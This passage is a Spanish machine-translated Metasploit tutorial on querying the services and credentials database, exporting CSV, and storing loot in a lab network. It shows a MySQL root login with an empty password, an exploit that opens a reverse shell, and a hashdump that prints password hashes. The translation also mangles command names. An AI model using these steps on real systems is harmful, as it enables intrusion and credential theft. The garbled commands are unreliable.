	172.16.194.134 microsoft-ds Microsoft Windows XP microsoft-ds 
	172.16.194.134 mysql 

Aquí buscamos todos los hosts contenidos en nuestra base de datos con un nombre de servicio que contenga la cadena 'http'.


	msf> servicios -c nombre, info -S http
	
	Servicios
	========
	
	información del nombre de host
	---- ---- ----
	172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl / 2.2.17 OpenSSL / 0.9.8o PHP / 5.3.4 mod_perl / 2.0.4 Perl / v5.10.1 
	172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl / 2.2.17 OpenSSL / 0.9.8o PHP / 5.3.4 mod_perl / 2.0.4 Perl / v5.10.1 
	172.16.194.172 http Apache httpd 2.2.8 (Ubuntu) DAV / 2 
	172.16.194.172 http Apache Tomcat / Coyote JSP motor 1.1 
	Las combinaciones para buscar son enormes. Podemos usar puertos específicos o rangos de puertos. Nombre de servicio completo o parcial cuando se utilizan los modificadores -s o -S . Para todos los 	hosts o solo para unos pocos… La lista sigue y sigue. Aquí hay algunos ejemplos, pero es posible que deba experimentar con estas funciones para obtener lo que desea y necesita en sus búsquedas.
	msf> servicios -c info, nombre -p 445
	
	Servicios
	========
	
	nombre de información de host
	---- ---- ----
	172.16.194.134 Microsoft Windows XP microsoft-ds microsoft-ds
	172.16.194.172 Grupo de trabajo Samba smbd 3.X: GRUPO DE TRABAJO netbios-ssn
	msf> servicios -c puerto, proto, estado -p 70-81
	Servicios
	========
	puerto de host proto state
	---- ---- ----- -----
	172.16.194.134 80 tcp abierto
	172.16.194.172 75 tcp cerrado
	172.16.194.172 71 tcp cerrado
	172.16.194.172 72 tcp cerrado
	172.16.194.172 73 tcp cerrado
	172.16.194.172 74 tcp cerrado
	172.16.194.172 70 tcp cerrado
	172.16.194.172 76 tcp cerrado
	172.16.194.172 77 tcp cerrado
	172.16.194.172 78 tcp cerrado
	172.16.194.172 79 tcp cerrado
	172.16.194.172 80 tcp abierto
	172.16.194.172 81 tcp cerrado
	msf> servicios -s http -c puerto 172.16.194.134
	Servicios
	========
	Puerto host
	---- ----
	172.16.194.134 80
	172.16.194.134 443
	
	msf> servicios -S Unr
	Servicios
	========
	puerto de host proto nombre estado información
	---- ---- ----- ---- ----- ----
	172.16.194.172 6667 tcp irc abierto Unreal ircd
	172.16.194.172 6697 tcp irc abierto Unreal ircd


## EXPORTACIÓN CSV

Tanto los comandos de hosts como de servicios nos brindan un medio para guardar los resultados de nuestra consulta en un archivo. El formato de archivo es un valor separado por comas o CSV. Seguido por el -o con la ruta y el nombre del archivo, la información que se ha mostrado en la pantalla en este punto ahora se guardará en el disco.


	msf> servicios -s http -c puerto 172.16.194.134 -o /root/msfu/http.csv
	
	[*] Escribió servicios en /root/msfu/http.csv
	
	msf> hosts -S Linux -o /root/msfu/linux.csv
	[*] Escribió hosts en /root/msfu/linux.csv
	
	msf> cat /root/msfu/linux.csv
	[*] ejecutivo: cat /root/msfu/linux.csv
	
	dirección, mac, nombre, os_name, os_flavor, os_sp, propósito, información, comentarios
	"172.16.194.172", "00: 0C: 29: D1: 62: 80", "", "Linux", "Debian", "", "servidor", "", ""
	
	msf> cat /root/msfu/http.csv
	[*] ejecutivo: cat /root/msfu/http.csv
	
	Puerto host
	"172.16.194.134", "80"
	"172.16.194.134", "443"

## CREDS

El comando creds se usa para administrar las credenciales encontradas y usadas para los objetivos en nuestra base de datos. Ejecutar este comando sin ninguna opción mostrará las credenciales guardadas actualmente.


	msf> creds
	
	Cartas credenciales
	===========
	
	puerto de host usuario tipo de paso activo?
	---- ---- ---- ---- ---- -------
	
	[*] Se encontraron 0 credenciales.
	Al igual que con el comando ' db_nmap ', los resultados exitosos relacionados con las credenciales se guardarán automáticamente en nuestro espacio de trabajo activo. Ejecutemos el módulo auxiliar 	' mysql_login ' y veamos qué sucede cuando Metasploit escanea nuestro servidor.
	
	msf auxiliar ( mysql_login )> run
	
	[*] 172.16.194.172:3306 MYSQL - Se encontró la versión 5.0.51a de MySQL remota
	[*] 172.16.194.172:3306 MYSQL - [1/2] - Intentando nombre de usuario: 'root' con contraseña: ''
	[*] 172.16.194.172:3306 - INICIO DE SESIÓN EXITOSO 'root': ''
	[*] Escaneado 1 de 1 hosts (100% completo)
	[*] Se completó la ejecución del módulo auxiliar
	
	
	auxiliar de msf ( mysql_login )> creds
	
	Cartas credenciales
	===========
	
	puerto de host usuario tipo de paso activo?
	---- ---- ---- ---- ---- -------
	172.16.194.172 3306 contraseña raíz verdadera
	
	[*] Se encontró 1 credencial.
	auxiliar de msf ( mysql_login )>
	Podemos ver que el módulo pudo conectarse a nuestro servidor mysql, y debido a esto, Metasploit guardó las credenciales en nuestra base de datos automáticamente para referencia futura.
	

Durante la post-explotación de un host, la recopilación de credenciales de usuario es una actividad importante para penetrar aún más en la red de destino. A medida que recopilamos conjuntos de credenciales, podemos agregarlos a nuestra base de datos con el comando creds -a .


	msf> creds -a 172.16.194.134 -p 445 -u Administrador -P 7bf4f254b222bb24aad3b435b51404ee: 2892d26cdf84d7a70e2eb3b9f05c425e :::
	[*] Hora: 2012-06-20 20:31:42 UTC Credencial: host = 172.16.194.134 puerto = 445 proto = tcp sname = type = password user = Administrator pass = 7bf4f254b222bb24aad3b435b51404ee: 2892d26cdf84d7a70e2eb3b9 :::5c425 active
	
	msf> creds
	
	Cartas credenciales
	===========
	
	puerto de host usuario tipo de paso activo?
	---- ---- ---- ---- ---- -------
	172.16.194.134 445 Administrador 7bf4f254b222bb24aad3b435b51404ee: 2892d26cdf84d7a70e2eb3b9f05c425e ::: contraseña verdadera
	
	[*] Se encontró 1 credencial.
	BOTÍN (loots)

Una vez que haya comprometido un sistema (o tres), uno de los objetivos puede ser recuperar los volcados de hash. Desde un sistema Windows o * nix. En el caso de un volcado de hash exitoso, esta información se almacenará en nuestra base de datos. Podemos ver estos volcados usando el comando loot . Como con casi todos los comandos, agregar el modificador -h mostrará un poco más de información.


	msf> loots -h
	Uso: loots
	 Información: botín [-h] [addr1 addr2 ...] [-t <type1, type2>]
	  Agregar: loot -f [fname] -i [info] -a [addr1 addr2 ...] [-t [type]
	  Del: loot -d [addr1 addr2 ...]
	
	  -a, - agrega Agregar botín a la lista de direcciones, en lugar de listar
	  -d, - eliminar Eliminar * todo * botín que coincida con el host y el tipo
	  -f, - archivo Archivo con contenido del botín para agregar
	  -i, - info Información del botín para agregar
	  -t <tipo1, tipo2> Busca una lista de tipos
	  -h, - ayuda Muestra esta información de ayuda
	  -S, - buscar Cadena de búsqueda para filtrar por

Aquí hay un ejemplo de cómo se llenaría la base de datos con algún botín .


	msf exploit ( usermap_script )> exploit
	
	[*] Iniciado doble manipulador inverso
	[*] Aceptó la primera conexión de cliente ...
	[*] Aceptó la segunda conexión de cliente ...
	[*] Comando: echo 4uGPYOrars5OojdL;
	[*] Escribiendo en el conector A
	[*] Escribiendo en el conector B
	[*] Leyendo desde enchufes ...
	[*] Leyendo desde el enchufe B
	[*] B: "4uGPYOrars5OojdL \ r \ n"
	[*] Coincidencia ...
	[*] A es entrada ...
	[*] Se abrió la sesión 1 del shell de comandos (172.16.194.163:4444 -> 172.16.194.172:55138) en 2012-06-27 19:38:54 -0400
	
	^ Z ¿ 
	Sesión de fondo 1? [Y / N]   y
	
	msf exploit ( usermap_script )> use post/linux/collect/hashdump 
	msf post ( hashdump )> mostrar opciones
	
	Opciones del módulo (post/linux/collect/hashdump):
	
	   Nombre Configuración actual requerida Descripción
	   ---- --------------- -------- -----------
	   SESIÓN 1 sí La sesión para ejecutar este módulo.
	
	msf post ( hashdump )> sesiones -l
	
	Sesiones activas
	===============
	
	  Conexión de información de tipo de identificación
	  - ---- ----------- ----------
	  1 shell unix 172.16.194.163:4444 -> 172.16.194.172:55138 (172.16.194.172)
	
	msf post ( hashdump )> run
	
	[+] root: $ 1 $ / avpfBJ1 $ x0z8w5UF9Iv. /DR9E9Lid.: 0: 0: root:/root:/bin/bash
	[+] sys: $ 1 $ fUX6BPOt $ Miyc3UpOzQJqz4s5wFD9l0: 3: 3: sys:/dev:/bin/sh
	[+] klog: $ 1 $ f2ZVMS4K $ R9XkI.CmLdHhdUE3X9jqP0: 103: 104 :: /home/klog:/bin/false
	[+] msfadmin: $ 1 $ XN10Zj2c $ Rt / zzCW3mLtUWA.ihZjA5 /: 1000: 1000: msfadmin ,,,: /home/msfadmin:/bin/bash
	[+] postgres: $ 1 $ Rw35ik.x $ MgQgZUuO5pAoUvfJhfcYe /: 108: 117: Administrador de PostgreSQL ,,,:/va /lib/postgresql:/bin/bash
	[+] usuario: $ 1 $ HESu9xrH $ k.o3G93DGoXIiQKkPmUgZ0: 1001: 1001: solo un usuario, 111 ,,:/home/user:/bin/bash
	[+] servicio: $ 1 $ kR3ue7JZ $ 7GxELDupr5Ohp6cjZ3Bu //: 1002: 1002: ,,,: /home/service:/bin/bash
	[+] Archivo de contraseña sin sombra: /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
	[*] Se completó la ejecución del módulo de publicación
	
	
	
	msf post ( hashdump )> loot
	
	Botín
	====
	
	host servicio tipo nombre contenido información ruta
	---- ------- ---- ---- ------- ---- ----
	172.16.194.172 linux.hashes unshadowed_passwd.pwd text / plain Archivo de contraseña sin sombra de Linux /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
	172.16.194.172 linux.passwd passwd.tx text / plain Linux Passwd File /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.passwd_953644.txt
	172.16.194.172 linux.shadow shadow.tx text / plain Archivo de sombra de contraseña de Linux /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.shadow_492948.txt
